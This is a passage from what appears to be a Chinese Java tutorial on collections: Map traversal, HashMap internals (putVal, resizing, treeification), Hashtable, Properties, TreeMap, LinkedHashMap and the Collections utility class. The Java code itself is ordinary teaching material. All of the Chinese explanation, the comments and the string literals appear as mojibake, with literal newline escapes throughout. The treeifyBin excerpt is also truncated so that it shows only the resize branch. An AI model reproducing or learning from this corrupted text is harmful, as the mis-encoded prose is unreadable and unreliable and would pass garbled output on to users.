éå†\n\n#### keySet:è·å–æ‰€æœ‰çš„é”®\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"é‚“è¶…\", \"å­™ä¿ª\");\n        map.put(\"ç‹å®å¼º\", \"é©¬è“‰\");\n        map.put(\"å®‹å–†\", \"é©¬è“‰\");\n        map.put(\"åˆ˜ä»¤åš\", null);\n        map.put(null, \"åˆ˜äº¦è²\");\n        map.put(\"é¹¿æ™—\", \"å…³æ™“å½¤\");\n        //æ–¹æ³•1: å…ˆå–å‡ºæ‰€æœ‰çš„Key , é€šè¿‡Key å–å‡ºå¯¹åº”çš„Value\n        Set keyset = map.keySet();\n        //(1) å¢å¼ºfor\n        System.out.println(\"-----ç¬¬ä¸€ç§æ–¹å¼-------\");\n        for (Object key : keyset) {\n            System.out.println(key + \"-\" + map.get(key));\n        }\n        //(2) è¿­ä»£å™¨\n        System.out.println(\"----ç¬¬äºŒç§æ–¹å¼--------\");\n        Iterator iterator = keyset.iterator();\n        while (iterator.hasNext()) {\n            Object key = iterator.next();\n            System.out.println(key + \"-\" + map.get(key));\n        }\n    }\n}\n```\n\n#### values:è·å–æ‰€æœ‰çš„å€¼\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\n\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"é‚“è¶…\", \"å­™ä¿ª\");\n        map.put(\"ç‹å®å¼º\", \"é©¬è“‰\");\n        map.put(\"å®‹å–†\", \"é©¬è“‰\");\n        map.put(\"åˆ˜ä»¤åš\", null);\n        map.put(null, \"åˆ˜äº¦è²\");\n        map.put(\"é¹¿æ™—\", \"å…³æ™“å½¤\");\n\n        //æ–¹æ³•2: æŠŠæ‰€æœ‰çš„values å–å‡º\n        Collection values = map.values();\n        //è¿™é‡Œå¯ä»¥ä½¿ç”¨æ‰€æœ‰çš„Collections ä½¿ç”¨çš„éå†æ–¹æ³•\n        //(1) å¢å¼ºfor\n        System.out.println(\"---å–å‡ºæ‰€æœ‰çš„value å¢å¼ºfor----\");\n        for (Object value : values) {\n            System.out.println(value);\n        }\n        //(2) è¿­ä»£å™¨\n        System.out.println(\"---å–å‡ºæ‰€æœ‰çš„value è¿­ä»£å™¨----\");\n        Iterator iterator2 = values.iterator();\n        while (iterator2.hasNext()) {\n            Object value = iterator2.next();\n            System.out.println(value);\n        }\n    }\n}\n```\n\n#### entrySet:è·å–æ‰€æœ‰å…³ç³»k-V\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"é‚“è¶…\", \"å­™ä¿ª\");\n        map.put(\"ç‹å®å¼º\", \"é©¬è“‰\");\n        map.put(\"å®‹å–†\", \"é©¬è“‰\");\n        map.put(\"åˆ˜ä»¤åš\", null);\n        map.put(null, \"åˆ˜äº¦è²\");\n        map.put(\"é¹¿æ™—\", \"å…³æ™“å½¤\");\n\n        //æ–¹æ³•3: é€šè¿‡EntrySet æ¥è·å–k-v\n        Set entrySet = map.entrySet();// EntrySet<Map.Entry<K,V>>\n        //(1) å¢å¼ºfor\n        System.out.println(\"----ä½¿ç”¨EntrySet çš„for å¢å¼º----\");\n        for (Object entry : entrySet) {\n            //å°†entry è½¬æˆMap.Entry\n            Map.Entry m = (Map.Entry) entry;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n        //(2) è¿­ä»£å™¨\n        System.out.println(\"----ä½¿ç”¨EntrySet çš„è¿­ä»£å™¨----\");\n        Iterator iterator3 = entrySet.iterator();\n        while (iterator3.hasNext()) {\n            Object entry = iterator3.next();\n            Map.Entry m = (Map.Entry) entry;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n    }\n}\n```\n\n### ç»ƒä¹ \n\nä½¿ç”¨ HashMap æ·»åŠ  3 ä¸ªå‘˜å·¥å¯¹è±¡ï¼Œè¦æ±‚ é”®:å‘˜å·¥idã€å€¼:å‘˜å·¥å¯¹è±¡ï¼Œå¹¶éå†æ˜¾ç¤ºå·¥èµ„ > 18000çš„å‘˜å·¥(éå†æ–¹å¼æœ€å°‘ä¸¤ç§)ï¼Œå‘˜å·¥ç±»:å§“åã€å·¥èµ„ã€å‘˜å·¥id\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class MapExercise {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"1\",new Employee(\"å°æ˜\",20000,1));\n        map.put(\"2\",new Employee(\"å°çº¢\",30000,2));\n        map.put(\"3\",new Employee(\"å°åˆš\",10000,3));\n\n        //æ–¹æ³•1 ä½¿ç”¨keySet -> å¢å¼ºfor\n        Set set = map.keySet();\n        for (Object key :set) {\n            //å…ˆè·å–value\n            Employee emp = (Employee) map.get(key);\n            if (emp.getSal() > 18000){\n                System.out.println(\"emp = \" + emp);\n            }\n        }\n\n        //æ–¹æ³•2 ä½¿ç”¨EntrySet -> è¿­ä»£å™¨\n        Set set1 = map.entrySet();\n        Iterator iterator = set1.iterator();\n        while (iterator.hasNext()) {\n            Map.Entry entry = (Map.Entry) iterator.next();\n            Employee emp = (Employee) entry.getValue();\n            if (emp.getSal() > 18000){\n                System.out.println(\"emp = \" + emp);\n            }\n        }\n    }\n}\n\nclass Employee{\n    private String name;\n    private double sal;\n    private int id;\n\n    public Employee(String name, double sal, int id) {\n        this.name = name;\n        this.sal = sal;\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public double getSal() {\n        return sal;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"name='\" + name + '\\'' +\n                \", sal=\" + sal +\n                \", id=\" + id +\n                '}';\n    }\n}\n```\n\n## 1ã€HashMap\n\n### ç‰¹ç‚¹\n\n- HashMap æ˜¯ Map æ¥å£ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„å®ç°ç±»ã€‚\n- HashMap æ˜¯ä»¥ key-val  çš„æ–¹å¼æ¥å­˜å‚¨æ•°æ®(HashMap$Nodeç±»å‹) \n- keyä¸èƒ½é‡å¤ï¼Œä½†æ˜¯å€¼å¯ä»¥é‡å¤ï¼Œå…è®¸ä½¿ç”¨ null é”®å’Œ null å€¼ã€‚\n- å¦‚æœæ·»åŠ ç›¸åŒçš„ keyï¼Œåˆ™ä¼šè¦†ç›–åŸæ¥çš„ key-val ï¼Œç­‰åŒäºä¿®æ”¹ï¼ˆkeyä¸ä¼šæ›¿æ¢ï¼Œval ä¼šæ›¿æ¢ï¼‰\n- ä¸ HashSet ä¸€æ ·ï¼Œä¸ä¿è¯æ˜ å°„çš„é¡ºåºï¼Œå› ä¸ºåº•å±‚æ˜¯ä»¥ hash è¡¨çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼ˆhashMapåº•å±‚ æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘)\n- HashMap æ²¡æœ‰å®ç°åŒæ­¥ï¼Œå› æ­¤æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œæ–¹æ³•æ²¡æœ‰åšåŒæ­¥äº’æ–¥çš„æ“ä½œï¼Œæ²¡æœ‰ synchronized\n\n### åº•å±‚æœºåˆ¶åŠæºç å‰–æ\n\n- HashMap åº•å±‚ç»´æŠ¤äº† Node ç±»å‹çš„æ•°ç»„ tableï¼Œé»˜è®¤ä¸º null\n- å½“åˆ›å»ºå¯¹è±¡æ—¶ï¼Œå°†åŠ è½½å› å­(loadfactor)åˆå§‹åŒ–ä¸º 0.75\n- å½“æ·»åŠ  key-val æ—¶é€šè¿‡ key çš„å“ˆå¸Œå€¼å¾—åˆ°åœ¨ table çš„ç´¢å¼•ï¼Œç„¶ååˆ¤æ–­è¯¥ç´¢å¼•å¤„æ˜¯å¦æœ‰å…ƒç´ \n  - å¦‚æœæ²¡æœ‰å…ƒç´ ç›´æ¥æ·»åŠ \n  - å¦‚æœè¯¥ç´¢å¼•å¤„æœ‰å…ƒç´ ï¼Œåˆ¤æ–­è¯¥å…ƒç´ çš„ key å’Œå‡†å¤‡åŠ å…¥çš„ key æ˜¯å¦ç›¸ç­‰\n    - å¦‚æœç›¸ç­‰ï¼Œåˆ™ç›´æ¥æ›¿æ¢ val\n    - å¦‚æœä¸ç›¸ç­‰éœ€è¦åˆ¤æ–­æ˜¯æ ‘ç»“æ„è¿˜æ˜¯é“¾è¡¨ç»“æ„ï¼Œåšå‡ºç›¸åº”å¤„ç†\n    - å¦‚æœæ·»åŠ æ—¶å‘ç°å®¹é‡ä¸å¤Ÿï¼Œåˆ™éœ€è¦æ‰©å®¹ã€‚\n- ç¬¬1æ¬¡æ·»åŠ ï¼Œåˆ™éœ€è¦æ‰©å®¹ table å®¹é‡ä¸º 16ï¼Œä¸´ç•Œå€¼(threshold)ä¸º12 (16*0.75)\n- ä»¥åå†æ‰©å®¹ï¼Œåˆ™éœ€è¦æ‰©å®¹ table å®¹é‡ä¸ºåŸæ¥çš„ 2 å€(32)ï¼Œä¸´ç•Œå€¼ä¸ºåŸæ¥çš„ 2å€ï¼Œå³24ï¼Œä¾æ¬¡ç±»æ¨\n- åœ¨ Java8 ä¸­ï¼Œå¦‚æœä¸€æ¡é“¾è¡¨çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡ TREEIFY_THRESHOLD(é»˜è®¤æ˜¯8)ï¼Œå¹¶ä¸” table çš„å¤§å° >= MIN_TREEIFY_CAPACITY(é»˜è®¤64)ï¼Œå°±ä¼šè¿›è¡Œæ ‘åŒ–(çº¢é»‘æ ‘) \n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\n\npublic class HashMapSource1 {\n    public static void main(String[] args) {\n        HashMap map = new HashMap();\n        map.put(\"java\", 10);//ok\n        map.put(\"php\", 10);//ok\n        map.put(\"java\", 20);//æ›¿æ¢value\n        System.out.println(\"map=\" + map);\n    }\n}\n```\n\n1. æ‰§è¡Œæ„é€ å™¨new HashMap()\n\n```java\nåˆå§‹åŒ–åŠ è½½å› å­loadfactor = 0.75\nHashMap$Node[] table = null\n```\n\n2. æ‰§è¡Œput è°ƒç”¨ hash æ–¹æ³•\n\n```java\n//è®¡ç®—key çš„hash å€¼(h = key.hashCode()) ^ (h >>> 16)\npublic V put(K key, V value) {//K = \"java\" value = 10\n  return putVal(hash(key), key, value, false, true);\n}\n```\n\n3. æ‰§è¡ŒputVal\n\n```java\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n    Node<K, V>[] tab;Node<K, V> p;int n, i;//è¾…åŠ©å˜é‡\n//å¦‚æœåº•å±‚çš„table æ•°ç»„ä¸ºnull, æˆ–è€…length =0 , å°±æ‰©å®¹åˆ°16\n    if ((tab = table) == null || (n = tab.length) == 0)\n        n = (tab = resize()).length;\n//å–å‡ºhashå€¼å¯¹åº”tableçš„ç´¢å¼•ä½ç½®çš„Node, å¦‚æœä¸ºnull, å°±ç›´æ¥åŠ å…¥k-v\n    if ((p = tab[i = (n - 1) & hash]) == null)\n        //åˆ›å»ºæˆä¸€ä¸ªNode ,åŠ å…¥è¯¥ä½ç½®å³å¯\n        tab[i] = newNode(hash, key, value, null);\n    else {\n        Node<K, V> e;K k;//è¾…åŠ©å˜é‡\n// å¦‚æœtableçš„ç´¢å¼•ä½ç½®çš„keyçš„hashå’Œæ–°çš„keyçš„hashå€¼ç›¸åŒï¼Œ\n// å¹¶æ»¡è¶³(tableç°æœ‰çš„ç»“ç‚¹çš„keyå’Œå‡†å¤‡æ·»åŠ çš„keyæ˜¯åŒä¸€ä¸ªå¯¹è±¡||equals è¿”å›çœŸ)\n// å°±è®¤ä¸ºä¸èƒ½åŠ å…¥æ–°çš„k-v\n        if (p.hash == hash &&\n            ((k = p.key) == key || (key != null && key.equals(k))))\n            e = p;\n//å¦‚æœå½“å‰çš„tableå·²æœ‰çš„Nodeæ˜¯çº¢é»‘æ ‘ï¼Œå°±æŒ‰ç…§çº¢é»‘æ ‘çš„æ–¹å¼å¤„ç†\n        else if (p instanceof TreeNode)\n            e = ((TreeNode<K, V>) p).putTreeVal(this, tab, hash, key, value);\n        else {\n//å¦‚æœæ‰¾åˆ°çš„ç»“ç‚¹ï¼Œåé¢æ˜¯é“¾è¡¨ï¼Œå°±å¾ªç¯æ¯”è¾ƒ\n            for (int binCount = 0; ; ++binCount) {//æ­»å¾ªç¯\n                if ((e = p.next) == null) {//å¦‚æœæ•´ä¸ªé“¾è¡¨ï¼Œæ²¡æœ‰å’Œä»–ç›¸åŒ,å°±åŠ åˆ°è¯¥é“¾è¡¨çš„æœ€å\n                    p.next = newNode(hash, key, value, null);\n//åŠ å…¥åï¼Œåˆ¤æ–­å½“å‰é“¾è¡¨çš„ä¸ªæ•°ï¼Œæ˜¯å¦å·²ç»åˆ°8ä¸ªï¼Œåˆ°8ä¸ªå\n//å°±è°ƒç”¨treeifyBin æ–¹æ³•è¿›è¡Œçº¢é»‘æ ‘çš„è½¬æ¢\n                    if (binCount >= TREEIFY_THRESHOLD - 1)\n                        treeifyBin(tab, hash);\n                    break;\n                }\n                if (e.hash == hash && //å¦‚æœåœ¨å¾ªç¯æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰ç›¸åŒ,å°±break,å°±åªæ˜¯æ›¿æ¢value\n                        ((k = e.key) == key || (key != null && key.equals(k))))\n                    break;\n                p = e;\n            }\n        }\n        if (e != null) { // existing mapping for key\n            V oldValue = e.value;\n            if (!onlyIfAbsent || oldValue == null)\n                e.value = value; //æ›¿æ¢ï¼Œkey å¯¹åº”value\n            afterNodeAccess(e);\n            return oldValue;\n        }\n    }\n    ++modCount;//æ¯å¢åŠ ä¸€ä¸ªNode ,å°±size++\n    if (++size > threshold)//å¦‚size > ä¸´ç•Œå€¼ï¼Œå°±æ‰©å®¹\n        resize();\n    afterNodeInsertion(evict);\n    return null;\n}\n```\n\n4. å…³äºæ ‘åŒ–(è½¬æˆçº¢é»‘æ ‘)\n\n```java\n//å¦‚æœtableä¸ºnull ,æˆ–è€…å¤§å°è¿˜æ²¡æœ‰åˆ°64ï¼Œæš‚æ—¶ä¸æ ‘åŒ–ï¼Œè€Œæ˜¯è¿›è¡Œæ‰©å®¹.\n//å¦åˆ™æ‰ä¼šçœŸæ­£çš„æ ‘åŒ–-> å‰ªæ\n\nfinal void treeifyBin(Node<K,V>[] tab, int hash) {\n  int n, index; Node<K,V> e;\n  if (tab == null || (n = tab.length) < MIN_TREEIFY_CAPACITY)\n  \tresize();\n}\n```\n\n## 2ã€Hashtable\n\n### ç‰¹ç‚¹\n\n- å­˜æ”¾çš„å…ƒç´ æ˜¯é”®å€¼å¯¹ï¼šå³ K-V\n- Hashtable çš„é”®å’Œå€¼éƒ½ä¸èƒ½ä¸º nullï¼Œå¦åˆ™ä¼šæŠ›å‡º NullPointerException\n\n```java\nHashtable table = new Hashtable();//ok\ntable.put( \"john\", 100); //ok\ntable.put(null, 100); //å¼‚å¸¸\ntable.put(\"john\", null);//å¼‚å¸¸\ntable.put(\"john\", 200);//æ›¿æ¢\n```\n\n- Hashtable ä½¿ç”¨æ–¹æ³•åŸºæœ¬ä¸Šå’Œ HashMap ä¸€æ ·\n- Hashtable æ˜¯çº¿ç¨‹å®‰å…¨çš„ (synchronized)ï¼Œ HashMap æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„\n\n### Hashtableå’ŒHashMapå¯¹æ¯”\n\n|           | ç‰ˆæœ¬ | çº¿ç¨‹å®‰å…¨(åŒæ­¥) | æ•ˆç‡ | å…è®¸nullé”®nullå€¼ |\n| --------- | ---- | -------------- | ---- | ---------------- |\n| HashMap   | 1.2  | ä¸å®‰å…¨         | é«˜   | å¯ä»¥             |\n| Hashtable | 1.0  | å®‰å…¨           | è¾ƒä½ | ä¸å¯ä»¥           |\n\n## 3ã€Properties\n\n### ç‰¹ç‚¹\n\n- Properties ç±»ç»§æ‰¿è‡ª Hashtable ç±»å¹¶ä¸”å®ç°äº† Map æ¥å£ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ä¸€ç§é”®å€¼å¯¹çš„å½¢å¼æ¥ä¿å­˜æ•°æ®ã€‚\n\n- Properties ä½¿ç”¨ç‰¹ç‚¹å’Œ Hashtable ç±»ä¼¼ï¼Œkey å’Œ value ä¸èƒ½ä¸º null\n- Properties è¿˜å¯ä»¥ç”¨äºä» xxx.properties æ–‡ä»¶ä¸­ï¼ŒåŠ è½½æ•°æ®åˆ° Properties ç±»å¯¹è±¡ï¼Œå¹¶è¿›è¡Œè¯»å–å’Œä¿®æ”¹\n- xxx.properties æ–‡ä»¶é€šå¸¸ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹åœ¨ IO æµä¼šè®²è§£\n\n### åŸºæœ¬ä½¿ç”¨\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Properties;\npublic class Properties_ {\n    public static void main(String[] args) {\n        //åˆ›å»º\n        Properties properties = new Properties();\n        //properties.put(null, \"abc\");//æŠ›å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸\n        //properties.put(\"abc\", null); //æŠ›å‡ºç©ºæŒ‡é’ˆå¼‚å¸¸\n        //å¢åŠ \n        properties.put(\"john\", 100);//k-v\n        properties.put(\"lucy\", 100);\n        properties.put(\"lic\", 100);\n        properties.put(\"lic\", 88);//å¦‚æœæœ‰ç›¸åŒçš„keyï¼Œvalueè¢«æ›¿æ¢\n        System.out.println(\"properties=\" + properties);\n        //é€šè¿‡k è·å–å¯¹åº”å€¼\n        System.out.println(properties.get(\"lic\"));//88\n        //åˆ é™¤\n        properties.remove(\"lic\");\n        System.out.println(\"properties=\" + properties);\n        //ä¿®æ”¹\n        properties.put(\"john\", \"çº¦ç¿°\");\n        System.out.println(\"properties=\" + properties);\n    }\n}\n```\n\n## 4ã€TreeMap\n\nTreeMap ä¿è¯æŒ‰ç…§æ·»åŠ çš„ key-value å¯¹è¿›è¡Œæ’åºï¼Œå®ç°æ’åºéå†ã€‚æ­¤æ—¶ä½¿ç”¨ key çš„è‡ªç„¶æ’åºæˆ–å®šåˆ¶æ’åºã€‚åº•å±‚ä½¿ç”¨çº¢é»‘æ ‘\n\n### è‡ªç„¶æ’åº\n\n```java\nclass Student implements Comparable{\n     \n     ....\n     \n    @Override\n    public int compareTo(Object o) {\n        if (o instanceof Student) {\n            Student s = (Student) o;\n            int com = -this.name.compareTo(s.name);\n            if (com != 0) {\n                return com;\n            } else {\n                return Integer.compare(this.age, s.age);\n            }\n        }else\n            throw new RuntimeException();\n    }\n}\n\n```\n\n### å®šåˆ¶æ’åº\n\n```java\nTreeMap map1 = new TreeMap(new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                if (o1 instanceof Student && o2 instanceof Student) {\n                    Student s1 = (Student) o1;\n                    Student s2 = (Student) o2;\n                    return Integer.compare(s1.getAge(), s2.getAge());\n                } else {\n                    throw new RuntimeException(\"ç±»å‹ä¸åŒ¹é…\");\n                }\n            }\n        });\n```\n\n## 5ã€LinkedHashMap\n\n- LinkedHashMap ç»§æ‰¿è‡ª HashMapï¼Œæ‰€ä»¥å®ƒçš„åº•å±‚ä»ç„¶æ˜¯åŸºäºæ‹‰é“¾å¼æ•£åˆ—ç»“æ„å³ç”±æ•°ç»„å’Œé“¾è¡¨æˆ–çº¢é»‘æ ‘ç»„æˆã€‚\n\n- å¦å¤–ï¼ŒLinkedHashMap åœ¨ä¸Šé¢ç»“æ„çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†ä¸€æ¡åŒå‘é“¾è¡¨ï¼Œä½¿å¾—ä¸Šé¢çš„ç»“æ„å¯ä»¥ä¿æŒé”®å€¼å¯¹çš„æ’å…¥é¡ºåºã€‚åŒæ—¶é€šè¿‡å¯¹é“¾è¡¨è¿›è¡Œç›¸åº”çš„æ“ä½œï¼Œå®ç°äº†è®¿é—®é¡ºåºç›¸å…³é€»è¾‘ã€‚\n\n[è¶…è¯¦ç»†LinkedHashMapè§£æ](https://blog.csdn.net/qq_40050586/article/details/105851970?ops_request_misc=%7B%22request%5Fid%22%3A%22164138590416780265473460%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=164138590416780265473460&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-105851970.pc_search_insert_es_download_v2&utm_term=LinkHashMap&spm=1018.2226.3001.4187)\n\n## 6ã€ConcurrentHashMap\n\nçº¿ç¨‹å®‰å…¨çš„HashMap\n\nã€‚ã€‚ã€‚\n\n## ä¸‰ã€Collections å·¥å…·ç±»\n\n### ç®€ä»‹\n\n- Collections æ˜¯ä¸€ä¸ªæ“ä½œ Setã€List å’ŒMap ç­‰é›†åˆçš„å·¥å…·ç±»\n\n- Collections ä¸­æä¾›äº†ä¸€ç³»åˆ—é™æ€çš„æ–¹æ³•å¯¹é›†åˆå…ƒç´¢è¿›è¡Œæ’åºã€æŸ¥è¯¢å’Œä¿®æ”¹ç­‰æ“ä½œ\n\n### å¸¸ç”¨æ–¹æ³•\n\n- reverse(List): åè½¬ List ä¸­å…ƒç´ çš„é¡ºåº\n- shuffle(List): å¯¹List é›†åˆå…ƒç´¢è¿›è¡Œéšæœºæ’åº\n- sort(List): æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºå¯¹æŒ‡å®š List é›†åˆå…ƒç´ æŒ‰å‡åºæ’åº\n- sort(List, Comparator): æ ¹æ®æŒ‡å®šçš„ Comparator äº§ç”Ÿçš„é¡ºåºå¯¹ List é›†åˆå…ƒç´ è¿›è¡Œæ’åº\n- swap(List, int, int): å°†æŒ‡å®š List é›†åˆä¸­çš„ i å¤„å…ƒç´ å’Œ j å¤„å…ƒç´ è¿›è¡Œäº¤æ¢\n- Object max(Collection): æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´ \n- Object max(Collection, Comparator): æ ¹æ®Comparator æŒ‡å®šçš„é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´ \n3) Object min(Collection)\n4) Object min(Collection, Comparator)\n5) int frequency(Collection, Object): è¿”å›æŒ‡å®šé›†åˆä¸­æŒ‡å®šå…ƒç´ çš„å‡ºç°æ¬¡æ•°\n6) void copy(List dest,List src): å°† src ä¸­çš„å†…å®¹å¤åˆ¶åˆ° dest ä¸­\n- boolean replaceAll(List list, Object oldVal, Object newVal): ä½¿ç”¨æ–°å€¼æ›¿æ¢Listå¯¹è±¡çš„æ‰€æœ‰æ—§å€¼\n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.Comparator;\nimport java.util.List;\npublic class Collections_ {\n    public static void main(String[] args) {\n        //åˆ›å»ºArrayList é›†åˆï¼Œç”¨äºæµ‹è¯•.\n        List list = new ArrayList();\n        list.add(\"tom\");\n        list.add(\"smith\");\n        list.add(\"king\");\n        list.add(\"milan\");\n        list.add(\"tom\");\n        System.out.println(\"è‡ªç„¶é¡ºåºlist=\" + list);\n        // reverse(List)ï¼šåè½¬List ä¸­å…ƒç´ çš„é¡ºåº\n        Collections.reverse(list);\n        System.out.println(\"åè½¬list=\" + list);\n\n        // shuffle(List)ï¼šå¯¹List é›†åˆå…ƒç´ è¿›è¡Œéšæœºæ’åº\n         for (int i = 0; i < 3; i++) {\n         Collections.shuffle(list);\n         System.out.println(\"éšæœºæ’åºlist=\" + list);\n         }\n\n        // sort(List)ï¼šæ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºå¯¹æŒ‡å®šList é›†åˆå…ƒç´ æŒ‰å‡åºæ’åº\n        Collections.sort(list);\n        System.out.println(\"è‡ªç„¶æ’åºålist=\" + list);\n\n        // sort(Listï¼ŒComparator)ï¼šæ ¹æ®æŒ‡å®šçš„Comparator äº§ç”Ÿçš„é¡ºåºå¯¹List é›†åˆå…ƒç´ è¿›è¡Œæ’åº\n        //æˆ‘ä»¬å¸Œæœ›æŒ‰ç…§å­—ç¬¦ä¸²çš„é•¿åº¦å¤§å°æ’åº\n        Collections.sort(list, new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                return ((String) o2).length() - ((String) o1).length();\n            }\n        });\n        System.out.println(\"å­—ç¬¦ä¸²é•¿åº¦å¤§å°æ’åº=\" + list);\n\n        // swap(Listï¼Œintï¼Œ int)ï¼šå°†æŒ‡å®šlist é›†åˆä¸­çš„i å¤„å…ƒç´ å’Œj å¤„å…ƒç´ è¿›è¡Œäº¤æ¢\n        Collections.swap(list, 0, 1);\n        System.out.println(\"äº¤æ¢åçš„æƒ…å†µ\");\n        System.out.println(\"list=\" + list);\n\n\n        //Object max(Collection)ï¼šæ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´ \n        System.out.println(\"è‡ªç„¶é¡ºåºæœ€å¤§å…ƒç´ =\" + Collections.max(list));\n\n        //Object max(Collectionï¼ŒComparator)ï¼šæ ¹æ®Comparator æŒ‡å®šçš„é¡ºåºï¼Œè¿”å›ç»™å®šé›†åˆä¸­çš„æœ€å¤§å…ƒç´ \n        //æ¯”å¦‚ï¼Œæˆ‘ä»¬è¦è¿”å›é•¿åº¦æœ€å¤§çš„å…ƒç´ \n        Object maxObject = Collections.max(list, new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                return ((String)o1).length() - ((String)o2).length();\n            }\n        });\n        System.out.println(\"é•¿åº¦æœ€å¤§çš„å…ƒç´ =\" + maxObject);\n\n        //int frequency(Collectionï¼ŒObject)ï¼šè¿”å›æŒ‡å®šé›†åˆä¸­æŒ‡å®šå…ƒç´ çš„å‡ºç°æ¬¡æ•°\n        System.out.println(\"tom å‡ºç°çš„æ¬¡æ•°=\" + Collections.frequency(list, \"tom\"));\n\n        //void copy(List dest,List src)ï¼šå°†src ä¸­çš„å†…å®¹å¤åˆ¶åˆ°dest ä¸­\n        ArrayList dest = new ArrayList();\n        //ä¸ºäº†å®Œæˆä¸€ä¸ªå®Œæ•´æ‹·è´ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç»™dest èµ‹å€¼ï¼Œå¤§å°å’Œlist.size()ä¸€æ ·\n        for(int i = 0; i < list.size(); i++) {\n            dest.add(\"\");\n        }\n        //æ‹·è´\n        Collections.copy(dest, list);\n        System.out.println(\"dest=\" + dest);\n        \n        //boolean replaceAll(List listï¼ŒObject oldValï¼ŒObject newVal)ï¼šä½¿ç”¨æ–°å€¼æ›¿æ¢List å¯¹è±¡çš„æ‰€æœ‰æ—§å€¼\n        //å¦‚æœlist ä¸­ï¼Œæœ‰tom å°±æ›¿æ¢æˆæ±¤å§†\n        Collections.replaceAll(list, \"tom\", \"æ±¤å§†\");\n        System.out.println(\"list æ›¿æ¢å=\" + list);\n    }\n}\n```\n\n## å››ã€é›†åˆæ€»ç»“\n\n### é›†åˆæ•°æ®ç»“æ„\n\n#### List\n\n| List       | ç»“æ„       | å›¾                                                  |\n| ---------- | ---------- | --------------------------------------------------- |\n| ArrayList  | Objectæ•°ç»„ | ![](https://img.jwt1399.top/img/interview-8-01.png) |\n| Vector     | Objectæ•°ç»„ | åŒ ArrayList                                        |\n| LinkedList | åŒå‘é“¾è¡¨   | ![](https://img.jwt1399.top/img/interview-9-03.png) |\n\n#### Set\n\n- HashSetï¼šæ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘(åŒHashMap)\n- LinkedHashSetï¼š æ•°ç»„+åŒå‘é“¾è¡¨+çº¢é»‘æ ‘(åŒLinkedHashMap)\n- TreeSetï¼šçº¢é»‘æ ‘(åŒ TreeMap)\n\n#### Map\n\n| Map           | ç»“æ„                 | å›¾                                                           |\n| ------------- | -------------------- | ------------------------------------------------------------ |\n| HashMap       | æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘     | ![](https://img.jwt1399.top/img/image-20220328194142473.png) |\n| Hashtable     | æ•°ç»„+é“¾è¡¨            | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDUwNTg2,size_16,color_FFFFFF,t_70-20220328201449674.png) |\n| LinkedHashMap | æ•°ç»„+åŒå‘é“¾è¡¨+çº¢é»‘æ ‘ | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDUwNTg2,size_16,color_FFFFFF,t_70.png) |\n| TreeMap       | çº¢é»‘æ ‘               | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgyMDU0Mg==,size_16,color_FFFFFF,t_70.png) |\n\n### é›†åˆé€‰å–\n\nåœ¨å¼€å‘ä¸­ï¼Œé€‰æ‹©ä»€ä¹ˆé›†åˆå®ç°ç±»ï¼Œä¸»è¦å–å†³äºä¸šåŠ¡æ“ä½œç‰¹ç‚¹ï¼Œç„¶åæ 